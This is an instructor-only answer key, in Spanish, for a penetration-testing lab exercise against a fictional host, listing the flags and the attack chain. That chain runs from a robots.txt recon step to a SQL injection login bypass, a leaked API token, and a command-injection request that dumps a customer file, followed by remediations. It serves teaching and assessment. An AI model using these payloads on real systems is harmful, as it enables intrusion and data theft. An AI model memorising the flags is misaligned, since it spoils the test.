# Solución — Práctico Final (SOLO DOCENTE)

> No compartir con alumnos.

## Levantar: `make lab N=final && make shell`

| Hito | Flag | Camino |
|---|---|---|
| R1 | `FLAG{final_recon_portal}` | `curl -s http://phantomcorp/robots.txt` → `/portal-rrhh`; el flag está en un comentario del HTML de `/portal-rrhh` |
| R2 | `FLAG{final_sqli_foothold}` | SQLi bypass: `POST /portal-rrhh/login` con `user=admin' -- ` |
| R3 | `FLAG{final_token_looted}` | el dashboard revela `/backup/rrhh.conf` → `API_TOKEN=phantom-api-7c1e` |
| R4 | `FLAG{final_crown_jewels}` | `GET /api/reporte?token=phantom-api-7c1e&cmd=cat /app/priv/clientes.db.txt` (command injection gateada por el token) |

## La cadena esperada en el informe
recon (robots→portal) → explotación (SQLi auth bypass) → post/loot (token del
backup) → impacto (RCE con el token → dump de datos de clientes).

## Hallazgos que deberían reportar (con su remediación)
- Portal interno sin control de exposición → segmentar / no exponer.
- SQL injection en el login → consultas parametrizadas.
- Backup de configuración accesible por HTTP con secretos → sacarlo, rotar el token.
- Command injection en /api/reporte → no pasar input a shell; token no basta.
- Encadenamiento: el eslabón que corta antes = parametrizar el login (sin foothold, no hay cadena).
